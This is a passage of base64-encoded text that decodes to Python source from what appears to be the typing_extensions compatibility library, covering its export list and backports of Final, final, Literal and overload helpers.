ZyBwcmltaXRpdmVzLlxuICAgIFwnQ2xhc3NWYXJcJyxcbiAgICBcJ0NvbmNhdGVuYXRlXCcsXG4gICAgXCdGaW5hbFwnLFxuICAgIFwnTGl0ZXJhbFN0cmluZ1wnLFxuICAgIFwnUGFyYW1TcGVjXCcsXG4gICAgXCdQYXJhbVNwZWNBcmdzXCcsXG4gICAgXCdQYXJhbVNwZWNLd2FyZ3NcJyxcbiAgICBcJ1NlbGZcJyxcbiAgICBcJ1R5cGVcJyxcbiAgICBcJ1R5cGVWYXJUdXBsZVwnLFxuICAgIFwnVW5wYWNrXCcsXG5cbiAgICAjIEFCQ3MgKGZyb20gY29sbGVjdGlvbnMuYWJjKS5cbiAgICBcJ0F3YWl0YWJsZVwnLFxuICAgIFwnQXN5bmNJdGVyYXRvclwnLFxuICAgIFwnQXN5bmNJdGVyYWJsZVwnLFxuICAgIFwnQ29yb3V0aW5lXCcsXG4gICAgXCdBc3luY0dlbmVyYXRvclwnLFxuICAgIFwnQXN5bmNDb250ZXh0TWFuYWdlclwnLFxuICAgIFwnQ2hhaW5NYXBcJyxcblxuICAgICMgQ29uY3JldGUgY29sbGVjdGlvbiB0eXBlcy5cbiAgICBcJ0NvbnRleHRNYW5hZ2VyXCcsXG4gICAgXCdDb3VudGVyXCcsXG4gICAgXCdEZXF1ZVwnLFxuICAgIFwnRGVmYXVsdERpY3RcJyxcbiAgICBcJ09yZGVyZWREaWN0XCcsXG4gICAgXCdUeXBlZERpY3RcJyxcblxuICAgICMgU3RydWN0dXJhbCBjaGVja3MsIGEuay5hLiBwcm90b2NvbHMuXG4gICAgXCdTdXBwb3J0c0luZGV4XCcsXG5cbiAgICAjIE9uZS1vZmYgdGhpbmdzLlxuICAgIFwnQW5ub3RhdGVkXCcsXG4gICAgXCdhc3NlcnRfbmV2ZXJcJyxcbiAgICBcJ2Fzc2VydF90eXBlXCcsXG4gICAgXCdjbGVhcl9vdmVybG9hZHNcJyxcbiAgICBcJ2RhdGFjbGFzc190cmFuc2Zvcm1cJyxcbiAgICBcJ2dldF9vdmVybG9hZHNcJyxcbiAgICBcJ2ZpbmFsXCcsXG4gICAgXCdnZXRfYXJnc1wnLFxuICAgIFwnZ2V0X29yaWdpblwnLFxuICAgIFwnZ2V0X3R5cGVfaGludHNcJyxcbiAgICBcJ0ludFZhclwnLFxuICAgIFwnaXNfdHlwZWRkaWN0XCcsXG4gICAgXCdMaXRlcmFsXCcsXG4gICAgXCdOZXdUeXBlXCcsXG4gICAgXCdvdmVybG9hZFwnLFxuICAgIFwnUHJvdG9jb2xcJyxcbiAgICBcJ3JldmVhbF90eXBlXCcsXG4gICAgXCdydW50aW1lXCcsXG4gICAgXCdydW50aW1lX2NoZWNrYWJsZVwnLFxuICAgIFwnVGV4dFwnLFxuICAgIFwnVHlwZUFsaWFzXCcsXG4gICAgXCdUeXBlR3VhcmRcJyxcbiAgICBcJ1RZUEVfQ0hFQ0tJTkdcJyxcbiAgICBcJ05ldmVyXCcsXG4gICAgXCdOb1JldHVyblwnLFxuICAgIFwnUmVxdWlyZWRcJyxcbiAgICBcJ05vdFJlcXVpcmVkXCcsXG5dXG5cbiMgZm9yIGJhY2t3YXJkIGNvbXBhdGliaWxpdHlcblBFUF81NjAgPSBUcnVlXG5HZW5lcmljTWV0YSA9IHR5cGVcblxuIyBUaGUgZnVuY3Rpb25zIGJlbG93IGFyZSBtb2RpZmllZCBjb3BpZXMgb2YgdHlwaW5nIGludGVybmFsIGhlbHBlcnMuXG4jIFRoZXkgYXJlIG5lZWRlZCBieSBfUHJvdG9jb2xNZXRhIGFuZCB0aGV5IHByb3ZpZGUgc3VwcG9ydCBmb3IgUEVQIDY0Ni5cblxuX21hcmtlciA9IG9iamVjdCgpXG5cblxuZGVmIF9jaGVja19nZW5lcmljKGNscywgcGFyYW1ldGVycywgZWxlbj1fbWFya2VyKTpcbiAgICAiIiJDaGVjayBjb3JyZWN0IGNvdW50IGZvciBwYXJhbWV0ZXJzIG9mIGEgZ2VuZXJpYyBjbHMgKGludGVybmFsIGhlbHBlcikuXG4gICAgVGhpcyBnaXZlcyBhIG5pY2UgZXJyb3IgbWVzc2FnZSBpbiBjYXNlIG9mIGNvdW50IG1pc21hdGNoLlxuICAgICIiIlxuICAgIGlmIG5vdCBlbGVuOlxuICAgICAgICByYWlzZSBUeXBlRXJyb3IoZiJ7Y2xzfSBpcyBub3QgYSBnZW5lcmljIGNsYXNzIilcbiAgICBpZiBlbGVuIGlzIF9tYXJrZXI6XG4gICAgICAgIGlmIG5vdCBoYXNhdHRyKGNscywgIl9fcGFyYW1ldGVyc19fIikgb3Igbm90IGNscy5fX3BhcmFtZXRlcnNfXzpcbiAgICAgICAgICAgIHJhaXNlIFR5cGVFcnJvcihmIntjbHN9IGlzIG5vdCBhIGdlbmVyaWMgY2xhc3MiKVxuICAgICAgICBlbGVuID0gbGVuKGNscy5fX3BhcmFtZXRlcnNfXylcbiAgICBhbGVuID0gbGVuKHBhcmFtZXRlcnMpXG4gICAgaWYgYWxlbiAhPSBlbGVuOlxuICAgICAgICBpZiBoYXNhdHRyKGNscywgIl9fcGFyYW1ldGVyc19fIik6XG4gICAgICAgICAgICBwYXJhbWV0ZXJzID0gW3AgZm9yIHAgaW4gY2xzLl9fcGFyYW1ldGVyc19fIGlmIG5vdCBfaXNfdW5wYWNrKHApXVxuICAgICAgICAgICAgbnVtX3R2X3R1cGxlcyA9IHN1bShpc2luc3RhbmNlKHAsIFR5cGVWYXJUdXBsZSkgZm9yIHAgaW4gcGFyYW1ldGVycylcbiAgICAgICAgICAgIGlmIChudW1fdHZfdHVwbGVzID4gMCkgYW5kIChhbGVuID49IGVsZW4gLSBudW1fdHZfdHVwbGVzKTpcbiAgICAgICAgICAgICAgICByZXR1cm5cbiAgICAgICAgcmFpc2UgVHlwZUVycm9yKGYiVG9vIHtcJ21hbnlcJyBpZiBhbGVuID4gZWxlbiBlbHNlIFwnZmV3XCd9IHBhcmFtZXRlcnMgZm9yIHtjbHN9OyJcbiAgICAgICAgICAgICAgICAgICAgICAgIGYiIGFjdHVhbCB7YWxlbn0sIGV4cGVjdGVkIHtlbGVufSIpXG5cblxuaWYgc3lzLnZlcnNpb25faW5mbyA+PSAoMywgMTApOlxuICAgIGRlZiBfc2hvdWxkX2NvbGxlY3RfZnJvbV9wYXJhbWV0ZXJzKHQpOlxuICAgICAgICByZXR1cm4gaXNpbnN0YW5jZShcbiAgICAgICAgICAgIHQsICh0eXBpbmcuX0dlbmVyaWNBbGlhcywgX3R5cGVzLkdlbmVyaWNBbGlhcywgX3R5cGVzLlVuaW9uVHlwZSlcbiAgICAgICAgKVxuZWxpZiBzeXMudmVyc2lvbl9pbmZvID49ICgzLCA5KTpcbiAgICBkZWYgX3Nob3VsZF9jb2xsZWN0X2Zyb21fcGFyYW1ldGVycyh0KTpcbiAgICAgICAgcmV0dXJuIGlzaW5zdGFuY2UodCwgKHR5cGluZy5fR2VuZXJpY0FsaWFzLCBfdHlwZXMuR2VuZXJpY0FsaWFzKSlcbmVsc2U6XG4gICAgZGVmIF9zaG91bGRfY29sbGVjdF9mcm9tX3BhcmFtZXRlcnModCk6XG4gICAgICAgIHJldHVybiBpc2luc3RhbmNlKHQsIHR5cGluZy5fR2VuZXJpY0FsaWFzKSBhbmQgbm90IHQuX3NwZWNpYWxcblxuXG5kZWYgX2NvbGxlY3RfdHlwZV92YXJzKHR5cGVzLCB0eXBldmFyX3R5cGVzPU5vbmUpOlxuICAgICIiIkNvbGxlY3QgYWxsIHR5cGUgdmFyaWFibGUgY29udGFpbmVkIGluIHR5cGVzIGluIG9yZGVyIG9mXG4gICAgZmlyc3QgYXBwZWFyYW5jZSAobGV4aWNvZ3JhcGhpYyBvcmRlcikuIEZvciBleGFtcGxlOjpcblxuICAgICAgICBfY29sbGVjdF90eXBlX3ZhcnMoKFQsIExpc3RbUywgVF0pKSA9PSAoVCwgUylcbiAgICAiIiJcbiAgICBpZiB0eXBldmFyX3R5cGVzIGlzIE5vbmU6XG4gICAgICAgIHR5cGV2YXJfdHlwZXMgPSB0eXBpbmcuVHlwZVZhclxuICAgIHR2YXJzID0gW11cbiAgICBmb3IgdCBpbiB0eXBlczpcbiAgICAgICAgaWYgKFxuICAgICAgICAgICAgaXNpbnN0YW5jZSh0LCB0eXBldmFyX3R5cGVzKSBhbmRcbiAgICAgICAgICAgIHQgbm90IGluIHR2YXJzIGFuZFxuICAgICAgICAgICAgbm90IF9pc191bnBhY2sodClcbiAgICAgICAgKTpcbiAgICAgICAgICAgIHR2YXJzLmFwcGVuZCh0KVxuICAgICAgICBpZiBfc2hvdWxkX2NvbGxlY3RfZnJvbV9wYXJhbWV0ZXJzKHQpOlxuICAgICAgICAgICAgdHZhcnMuZXh0ZW5kKFt0IGZvciB0IGluIHQuX19wYXJhbWV0ZXJzX18gaWYgdCBub3QgaW4gdHZhcnNdKVxuICAgIHJldHVybiB0dXBsZSh0dmFycylcblxuXG5Ob1JldHVybiA9IHR5cGluZy5Ob1JldHVyblxuXG4jIFNvbWUgdW5jb25zdHJhaW5lZCB0eXBlIHZhcmlhYmxlcy4gIFRoZXNlIGFyZSB1c2VkIGJ5IHRoZSBjb250YWluZXIgdHlwZXMuXG4jIChUaGVzZSBhcmUgbm90IGZvciBleHBvcnQuKVxuVCA9IHR5cGluZy5UeXBlVmFyKFwnVFwnKSAgIyBBbnkgdHlwZS5cbktUID0gdHlwaW5nLlR5cGVWYXIoXCdLVFwnKSAgIyBLZXkgdHlwZS5cblZUID0gdHlwaW5nLlR5cGVWYXIoXCdWVFwnKSAgIyBWYWx1ZSB0eXBlLlxuVF9jbyA9IHR5cGluZy5UeXBlVmFyKFwnVF9jb1wnLCBjb3ZhcmlhbnQ9VHJ1ZSkgICMgQW55IHR5cGUgY292YXJpYW50IGNvbnRhaW5lcnMuXG5UX2NvbnRyYSA9IHR5cGluZy5UeXBlVmFyKFwnVF9jb250cmFcJywgY29udHJhdmFyaWFudD1UcnVlKSAgIyBEaXR0byBjb250cmF2YXJpYW50LlxuXG5DbGFzc1ZhciA9IHR5cGluZy5DbGFzc1ZhclxuXG4jIE9uIG9sZGVyIHZlcnNpb25zIG9mIHR5cGluZyB0aGVyZSBpcyBhbiBpbnRlcm5hbCBjbGFzcyBuYW1lZCAiRmluYWwiLlxuIyAzLjgrXG5pZiBoYXNhdHRyKHR5cGluZywgXCdGaW5hbFwnKSBhbmQgc3lzLnZlcnNpb25faW5mb1s6Ml0gPj0gKDMsIDcpOlxuICAgIEZpbmFsID0gdHlwaW5nLkZpbmFsXG4jIDMuN1xuZWxzZTpcbiAgICBjbGFzcyBfRmluYWxGb3JtKHR5cGluZy5fU3BlY2lhbEZvcm0sIF9yb290PVRydWUpOlxuXG4gICAgICAgIGRlZiBfX3JlcHJfXyhzZWxmKTpcbiAgICAgICAgICAgIHJldHVybiBcJ3R5cGluZ19leHRlbnNpb25zLlwnICsgc2VsZi5fbmFtZVxuXG4gICAgICAgIGRlZiBfX2dldGl0ZW1fXyhzZWxmLCBwYXJhbWV0ZXJzKTpcbiAgICAgICAgICAgIGl0ZW0gPSB0eXBpbmcuX3R5cGVfY2hlY2socGFyYW1ldGVycyxcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZlwne3NlbGYuX25hbWV9IGFjY2VwdHMgb25seSBhIHNpbmdsZSB0eXBlLlwnKVxuICAgICAgICAgICAgcmV0dXJuIHR5cGluZy5fR2VuZXJpY0FsaWFzKHNlbGYsIChpdGVtLCkpXG5cbiAgICBGaW5hbCA9IF9GaW5hbEZvcm0oXCdGaW5hbFwnLFxuICAgICAgICAgICAgICAgICAgICAgICBkb2M9IiIiQSBzcGVjaWFsIHR5cGluZyBjb25zdHJ1Y3QgdG8gaW5kaWNhdGUgdGhhdCBhIG5hbWVcbiAgICAgICAgICAgICAgICAgICAgICAgY2Fubm90IGJlIHJlLWFzc2lnbmVkIG9yIG92ZXJyaWRkZW4gaW4gYSBzdWJjbGFzcy5cbiAgICAgICAgICAgICAgICAgICAgICAgRm9yIGV4YW1wbGU6XG5cbiAgICAgICAgICAgICAgICAgICAgICAgICAgIE1BWF9TSVpFOiBGaW5hbCA9IDkwMDBcbiAgICAgICAgICAgICAgICAgICAgICAgICAgIE1BWF9TSVpFICs9IDEgICMgRXJyb3IgcmVwb3J0ZWQgYnkgdHlwZSBjaGVja2VyXG5cbiAgICAgICAgICAgICAgICAgICAgICAgICAgIGNsYXNzIENvbm5lY3Rpb246XG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgVElNRU9VVDogRmluYWxbaW50XSA9IDEwXG4gICAgICAgICAgICAgICAgICAgICAgICAgICBjbGFzcyBGYXN0Q29ubmVjdG9yKENvbm5lY3Rpb24pOlxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFRJTUVPVVQgPSAxICAjIEVycm9yIHJlcG9ydGVkIGJ5IHR5cGUgY2hlY2tlclxuXG4gICAgICAgICAgICAgICAgICAgICAgIFRoZXJlIGlzIG5vIHJ1bnRpbWUgY2hlY2tpbmcgb2YgdGhlc2UgcHJvcGVydGllcy4iIiIpXG5cbmlmIHN5cy52ZXJzaW9uX2luZm8gPj0gKDMsIDExKTpcbiAgICBmaW5hbCA9IHR5cGluZy5maW5hbFxuZWxzZTpcbiAgICAjIEBmaW5hbCBleGlzdHMgaW4gMy44KywgYnV0IHdlIGJhY2twb3J0IGl0IGZvciBhbGwgdmVyc2lvbnNcbiAgICAjIGJlZm9yZSAzLjExIHRvIGtlZXAgc3VwcG9ydCBmb3IgdGhlIF9fZmluYWxfXyBhdHRyaWJ1dGUuXG4gICAgIyBTZWUgaHR0cHM6Ly9idWdzLnB5dGhvbi5vcmcvaXNzdWU0NjM0MlxuICAgIGRlZiBmaW5hbChmKTpcbiAgICAgICAgIiIiVGhpcyBkZWNvcmF0b3IgY2FuIGJlIHVzZWQgdG8gaW5kaWNhdGUgdG8gdHlwZSBjaGVja2VycyB0aGF0XG4gICAgICAgIHRoZSBkZWNvcmF0ZWQgbWV0aG9kIGNhbm5vdCBiZSBvdmVycmlkZGVuLCBhbmQgZGVjb3JhdGVkIGNsYXNzXG4gICAgICAgIGNhbm5vdCBiZSBzdWJjbGFzc2VkLiBGb3IgZXhhbXBsZTpcblxuICAgICAgICAgICAgY2xhc3MgQmFzZTpcbiAgICAgICAgICAgICAgICBAZmluYWxcbiAgICAgICAgICAgICAgICBkZWYgZG9uZShzZWxmKSAtPiBOb25lOlxuICAgICAgICAgICAgICAgICAgICAuLi5cbiAgICAgICAgICAgIGNsYXNzIFN1YihCYXNlKTpcbiAgICAgICAgICAgICAgICBkZWYgZG9uZShzZWxmKSAtPiBOb25lOiAgIyBFcnJvciByZXBvcnRlZCBieSB0eXBlIGNoZWNrZXJcbiAgICAgICAgICAgICAgICAgICAgLi4uXG4gICAgICAgICAgICBAZmluYWxcbiAgICAgICAgICAgIGNsYXNzIExlYWY6XG4gICAgICAgICAgICAgICAgLi4uXG4gICAgICAgICAgICBjbGFzcyBPdGhlcihMZWFmKTogICMgRXJyb3IgcmVwb3J0ZWQgYnkgdHlwZSBjaGVja2VyXG4gICAgICAgICAgICAgICAgLi4uXG5cbiAgICAgICAgVGhlcmUgaXMgbm8gcnVudGltZSBjaGVja2luZyBvZiB0aGVzZSBwcm9wZXJ0aWVzLiBUaGUgZGVjb3JhdG9yXG4gICAgICAgIHNldHMgdGhlIGBgX19maW5hbF9fYGAgYXR0cmlidXRlIHRvIGBgVHJ1ZWBgIG9uIHRoZSBkZWNvcmF0ZWQgb2JqZWN0XG4gICAgICAgIHRvIGFsbG93IHJ1bnRpbWUgaW50cm9zcGVjdGlvbi5cbiAgICAgICAgIiIiXG4gICAgICAgIHRyeTpcbiAgICAgICAgICAgIGYuX19maW5hbF9fID0gVHJ1ZVxuICAgICAgICBleGNlcHQgKEF0dHJpYnV0ZUVycm9yLCBUeXBlRXJyb3IpOlxuICAgICAgICAgICAgIyBTa2lwIHRoZSBhdHRyaWJ1dGUgc2lsZW50bHkgaWYgaXQgaXMgbm90IHdyaXRhYmxlLlxuICAgICAgICAgICAgIyBBdHRyaWJ1dGVFcnJvciBoYXBwZW5zIGlmIHRoZSBvYmplY3QgaGFzIF9fc2xvdHNfXyBvciBhXG4gICAgICAgICAgICAjIHJlYWQtb25seSBwcm9wZXJ0eSwgVHlwZUVycm9yIGlmIGl0XCdzIGEgYnVpbHRpbiBjbGFzcy5cbiAgICAgICAgICAgIHBhc3NcbiAgICAgICAgcmV0dXJuIGZcblxuXG5kZWYgSW50VmFyKG5hbWUpOlxuICAgIHJldHVybiB0eXBpbmcuVHlwZVZhcihuYW1lKVxuXG5cbiMgMy44KzpcbmlmIGhhc2F0dHIodHlwaW5nLCBcJ0xpdGVyYWxcJyk6XG4gICAgTGl0ZXJhbCA9IHR5cGluZy5MaXRlcmFsXG4jIDMuNzpcbmVsc2U6XG4gICAgY2xhc3MgX0xpdGVyYWxGb3JtKHR5cGluZy5fU3BlY2lhbEZvcm0sIF9yb290PVRydWUpOlxuXG4gICAgICAgIGRlZiBfX3JlcHJfXyhzZWxmKTpcbiAgICAgICAgICAgIHJldHVybiBcJ3R5cGluZ19leHRlbnNpb25zLlwnICsgc2VsZi5fbmFtZVxuXG4gICAgICAgIGRlZiBfX2dldGl0ZW1fXyhzZWxmLCBwYXJhbWV0ZXJzKTpcbiAgICAgICAgICAgIHJldHVybiB0eXBpbmcuX0dlbmVyaWNBbGlhcyhzZWxmLCBwYXJhbWV0ZXJzKVxuXG4gICAgTGl0ZXJhbCA9IF9MaXRlcmFsRm9ybShcJ0xpdGVyYWxcJyxcbiAgICAgICAgICAgICAgICAgICAgICAgICAgIGRvYz0iIiJBIHR5cGUgdGhhdCBjYW4gYmUgdXNlZCB0byBpbmRpY2F0ZSB0byB0eXBlIGNoZWNrZXJzXG4gICAgICAgICAgICAgICAgICAgICAgICAgICB0aGF0IHRoZSBjb3JyZXNwb25kaW5nIHZhbHVlIGhhcyBhIHZhbHVlIGxpdGVyYWxseSBlcXVpdmFsZW50XG4gICAgICAgICAgICAgICAgICAgICAgICAgICB0byB0aGUgcHJvdmlkZWQgcGFyYW1ldGVyLiBGb3IgZXhhbXBsZTpcblxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHZhcjogTGl0ZXJhbFs0XSA9IDRcblxuICAgICAgICAgICAgICAgICAgICAgICAgICAgVGhlIHR5cGUgY2hlY2tlciB1bmRlcnN0YW5kcyB0aGF0IFwndmFyXCcgaXMgbGl0ZXJhbGx5IGVxdWFsIHRvXG4gICAgICAgICAgICAgICAgICAgICAgICAgICB0aGUgdmFsdWUgNCBhbmQgbm8gb3RoZXIgdmFsdWUuXG5cbiAgICAgICAgICAgICAgICAgICAgICAgICAgIExpdGVyYWxbLi4uXSBjYW5ub3QgYmUgc3ViY2xhc3NlZC4gVGhlcmUgaXMgbm8gcnVudGltZVxuICAgICAgICAgICAgICAgICAgICAgICAgICAgY2hlY2tpbmcgdmVyaWZ5aW5nIHRoYXQgdGhlIHBhcmFtZXRlciBpcyBhY3R1YWxseSBhIHZhbHVlXG4gICAgICAgICAgICAgICAgICAgICAgICAgICBpbnN0ZWFkIG9mIGEgdHlwZS4iIiIpXG5cblxuX292ZXJsb2FkX2R1bW15ID0gdHlwaW5nLl9vdmVybG9hZF9kdW1teSAgIyBub3FhXG5cblxuaWYgaGFzYXR0cih0eXBpbmcsICJnZXRfb3ZlcmxvYWRzIik6ICAjIDMuMTErXG4gICAgb3ZlcmxvYWQgPSB0eXBpbmcub3ZlcmxvYWRcbiAgICBnZXRfb3ZlcmxvYWRzID0gdHlwaW5nLmdldF9vdmVybG9hZHNcbiAgICBjbGVhcl9vdmVybG9hZHMgPSB0eXBpbmcuY2xlYXJfb3ZlcmxvYWRzXG5lbHNlOlxuICAgICMge21vZHVsZToge3F1YWxuYW1lOiB7Zmlyc3RsaW5lbm86IGZ1bmN9fX1cbiAgICBfb3ZlcmxvYWRfcmVnaXN0cnkgPSBjb2xsZWN0aW9ucy5kZWZhdWx0ZGljdChcbiAgICAgICAgZnVuY3Rvb2xzLnBhcnRpYWwoY29sbGVjdGlvbnMuZGVmYXVsdGRpY3QsIGRpY3QpXG4gICAgKVxuXG4gICAgZGVmIG92ZXJsb2FkKGZ1bmMpOlxuICAgICAgICAiIiJEZWNvcmF0b3IgZm9yIG92ZXJsb2FkZWQgZnVuY3Rpb25zL21ldGhvZHMuXG5cbiAgICAgICAgSW4gYSBzdHViIGZpbGUsIHBsYWNlIHR3byBvciBtb3JlIHN0dWIgZGVmaW5pdGlvbnMgZm9yIHRoZSBzYW1lXG4gICAgICAgIGZ1bmN0aW9uIGluIGEgcm93LCBlYWNoIGRlY29yYXRlZCB3aXRoIEBvdmVybG9hZC4gIEZvciBleGFtcGxlOlxuXG4gICAgICAgIEBvdmVybG9hZFxuICAgICAgICBkZWYgdXRmOCh2YWx1ZTogTm9uZSkgLT4gTm9uZTogLi4uXG4gICAgICAgIEBvdmVybG9hZFxuICAgICAgICBkZWYgdXRmOCh2YWx1ZTogYnl0ZXMpIC0+IGJ5dGVzOiAuLi5cbiAgICAgICAgQG92ZXJsb2FkXG4gICAgICAgIGRlZiB1dGY4KHZhbHVlOiBzdHIpIC0+IGJ5dGVzOiAuLi5cblxuICAgICAgICBJbiBhIG5vbi1zdHViIGZpbGUgKGkuZS4gYSByZWd1bGFyIC5weSBmaWxlKSwgZG8gdGhlIHNhbWUgYnV0XG4gICAgICAgIGZvbGxvdyBpdCB3aXRoIGFuIGltcGxlbWVudGF0aW9uLiAgVGhlIGltcGxlbWVudGF0aW9uIHNob3VsZCAqbm90KlxuICAgICAgICBiZSBkZWNvcmF0ZWQgd2l0aCBAb3ZlcmxvYWQuICBGb3IgZXhhbXBsZTpcblxuICAgICAgICBAb3ZlcmxvYWRcbiAgICAgICAgZGVmIHV0ZjgodmFsdWU6IE5vbmUpIC0+IE5vbmU6IC4uLlxuICAgICAgICBAb3ZlcmxvYWRcbiAgICAgICAgZGVmIHV0ZjgodmFsdWU6IGJ5dGVzKSAtPiBieXRlczogLi4uXG4gICAgICAgIEBvdmVybG9hZFxuICAgICAgICBkZWYgdXRmOCh2YWx1ZTogc3RyKSAtPiBieXRlczogLi4uXG4gICAgICAgIGRlZiB1dGY4KHZhbHVlKTpcbiAgICAgICAgICAgICMgaW1wbGVtZW50YXRpb24gZ29lcyBoZXJlXG5cbiAgICAgICAgVGhlIG92ZXJsb2FkcyBmb3IgYSBmdW5jdGlvbiBjYW4gYmUgcmV0cmlldmVkIGF0IHJ1bnRpbWUgdXNpbmcgdGhlXG4gICAgICAgIGdldF9vdmVybG9hZHMoKSBmdW5jdGlvbi5cbiAgICAgICAgIiIiXG4gICAgICAgICMgY2xhc3NtZXRob2QgYW5kIHN0YXRpY21ldGhvZFxuICAgICAgICBmID0gZ2V0YXR0cihmdW5jLCAiX19mdW5jX18iLCBmdW5jKVxuICAgICAgICB0cnk6XG4gICAgICAgICAgICBfb3ZlcmxvYWRfcmVnaXN0cnlbZi5fX21vZHVsZV9fXVtmLl9fcXVhbG5hbWVfX11bXG4gICAgICAgICAgICAgICAgZi5fX2NvZGVfXy5jb19maXJzdGxpbmVub1xuICAgICAgICAgICAgXSA9IGZ1bmNcbiAgICAgICAgZXhjZXB0IEF0dHJpYnV0ZUVycm9yOlxuICAgICAgICAgICAgIyBOb3QgYSBub3JtYWwgZnVuY3Rpb247IGlnbm9yZS5cbiAgICAgICAgICAgIHBhc3NcbiAgICAgICAgcmV0dXJuIF9vdmVybG9hZF9kdW1teVxuXG4gICAgZGVmIGdldF9vdmVybG9hZHMoZnVuYyk6XG4gICAgICAgICIiIlJldHVybiBhbGwgZGVmaW5lZCBvdmVybG9hZHMgZm9yICpmdW5jKiBhcyBhIHNlcXVlbmNlLiIiIlxuICAgICAgICAjIGNsYXNzbWV0aG9kIGFuZCBzdGF0aWNtZXRob2RcbiAgICAgICAgZiA9IGdldGF0dHIoZnVuYywgIl9fZnVuY19fIiwgZnVuYylcbiAgICAgICAgaWYgZi5fX21vZHVsZV9fIG5vdCBpbiBfb3ZlcmxvYWRfcmVnaXN0cnk6XG4gICAgICAgICAgICByZXR1cm4gW11cbiAgICAgICAgbW9kX2RpY3QgPSBfb3ZlcmxvYWRfcmVnaXN0cnlbZi5fX21vZHVsZV9fXVxuICAgICAgICBpZiBmLl9fcXVhbG5hbWVfXyBub3QgaW4gbW9kX2RpY3Q6XG4gICAgICAgICAgICByZXR1cm4gW11cbiAgICAgICAgcmV0dXJuIGxpc3QobW9kX2RpY3RbZi5fX3F1YWxuYW1lX19dLnZhbHVlcygpKVxuXG4gICAgZGVmIGNsZWFyX292ZXJsb2FkcygpOlxuICAgICAgICAiIiJDbGVhciBhbGwgb3ZlcmxvYWRzIGluIHRoZSByZWdpc3RyeS4iIiJcbiAgICAgICAgX292ZXJsb2FkX3JlZ2lzdHJ5LmNsZWFyKClcblxuXG4jIFRoaXMgaXMgbm90IGEgcmVhbCBnZW5lcmljIGNsYXNzLiAgRG9uXCd0IHVzZSBvdXRzaWRlIGFubm90YXRpb25zLlxuVHlwZSA9IHR5cGluZy5UeXBlXG5cbiMgVmFyaW91cyBBQkNzIG1pbWlja2luZyB0aG9zZSBpbiBjb2xsZWN0aW9ucy5hYmMuXG4jIEEgZmV3IGFyZSBzaW1wbHkgcmUtZXhwb3J0ZWQgZm9yIGNvbXBsZXRlbmVzcy5cblxuXG5Bd2FpdGFibGUgPSB0eXBpbmcuQXdhaXRhYmxlXG5Db3JvdXRpbmUgPSB0eXBpbmcuQ29yb3V0aW5lXG5Bc3luY0l0ZXJhYmxlID0gdHlwaW5nLkFzeW5jSXRlcmFibGVcbkFzeW5jSXRlcmF0b3IgPSB0eXBpbmcuQXN5bmNJdGVyYXRvclxuRGVxdWUgPSB0eXBpbmcuRGVxdWVcbkNvbnRleHRNYW5hZ2VyID0gdHlwaW5nLkNvbnRleHRNYW5hZ2VyXG5Bc3luY0NvbnRleHRNYW5hZ2VyID0gdHlwaW5nLkFzeW5jQ29udGV4dE1hbmFnZXJcbkRlZmF1bHREaWN0ID0gdHlwaW5nLkRlZmF1bHREaWN0XG5cbiMgMy43LjIrXG5pZiBoYXNhdHRyKHR5cGluZywgXCdPcmRlcmVkRGljdFwnKTpcbiAgICBPcmRlcmVkRGljdCA9IHR5cGluZy5PcmRlcmVkRGljdFxuIyAzLjcuMC0zLjcuMlxuZWxzZTpcbiAgICBPcmRlcmVkRGljdCA9IHR5cGluZy5fYWxpYXMoY29sbGVjdGlvbnMuT3JkZXJlZERpY3QsIChLVCwgVlQpKVxuXG5Db3VudGVyID0gdHlwaW5nLkNvdW50ZXJcbkNoYWluTWFwID0gdHlwaW5nLkNoYWluTWFwXG5Bc3luY0dlbmVyYXRvciA9IHR5cGluZy5Bc3luY0dlbmVyYXRvclxuTmV3VHlwZSA9IHR5cGluZy5OZXdUeXBlXG5UZXh0ID0gdHlwaW5nLlRleHRcblRZUEVfQ0hFQ0tJTkcgPSB0eXBpbmcuVFlQRV9DSEVDS0lOR1xuXG5cbl9QUk9UT19XSElURUxJU1QgPSBbXCdDYWxsYWJsZVwnLCBcJ0F3YWl0YWJsZVwnLFxuICAgICAgICAgICAgICAgICAgICBcJ0l0ZXJhYmxlXCcsIFwnSXRlcmF0b3JcJywgXCdBc3luY0l0ZXJhYmxlXCcsIFwnQXN5bmNJdGVyYXRvclwnLFxuICAgICAgICAgICAgICAgICAgICBcJ0hhc2hhYmxlXCcsIFwnU2l6ZWRcJywgXCdDb250YWluZXJcJywgXCdDb2xsZWN0aW9uXCcsIFwnUmV2ZXJzaWJsZVwnLFxuICAgICAgICAgICAgICAgICAgICBcJ0NvbnRleHRNYW5hZ2VyXCcsIFwnQXN5bmNDb250ZXh0TWFuYWdlclwnXVxuXG5cbmRlZiBfZ2V0X3Byb3RvY29sX2F0dHJzKGNscyk6XG4gICAgYXR0cnMgPSBzZXQoKVxuICAgIGZvciBiYXNlIGluIGNscy5fX21yb19fWzotMV06ICAjIHdpdGhvdXQgb2JqZWN0XG4gICAgICAgIGlmIGJhc2UuX19uYW1lX18gaW4gKFwnUHJvdG9jb2xcJywgXCdHZW5lcmljXCcpOlxuICAgICAgICAgICAgY29udGludWVcbiAgICAgICAgYW5ub3RhdGlvbnMgPSBnZXRhdHRyKGJhc2UsIFwnX19hbm5vdGF0aW9uc19fXCcsIHt9KVxuICAgICAgICBmb3IgYXR0ciBpbiBsaXN0KGJhc2UuX19kaWN0X18ua2V5cygpKSArIGxpc3QoYW5ub3RhdGlvbnMua2V5cygpKTpcbiAgICAgICAgICAgIGlmIChub3QgYXR0ci5zdGFydHN3aXRoKFwnX2FiY19cJykgYW5kIGF0dHIgbm90IGluIChcbiAgICAgICAgICAgICAgICAgICAgXCdfX2Fic3RyYWN0bWV0aG9kc19fXCcsIFwnX19hbm5vdGF0aW9uc19fXCcsIFwnX193ZWFrcmVmX19cJyxcbiAgICAgICAgICAgICAgICAgICAgXCdfaXNfcHJvdG9jb2xcJywgXCdfaXNfcnVudGltZV9wcm90b2NvbFwnLCBcJ19fZGljdF9fXCcsXG4gICAgICAgICAgICAgICAgICAgIFwnX19hcmdzX19cJywgXCdfX3Nsb3RzX19cJyxcbiAgICAgICAgICAgICAgICAgICAgXCdfX25leHRfaW5fbXJvX19cJywgXCdfX3BhcmFtZXRlcnNfX1wnLCBcJ19fb3JpZ2luX19cJyxcbiAgICAgICAgICAgICAgICAgICAgXCdfX29yaWdfYmFzZXNfX1wnLCBcJ19fZXh0cmFfX1wnLCBcJ19fdHJlZV9oYXNoX19cJyxcbi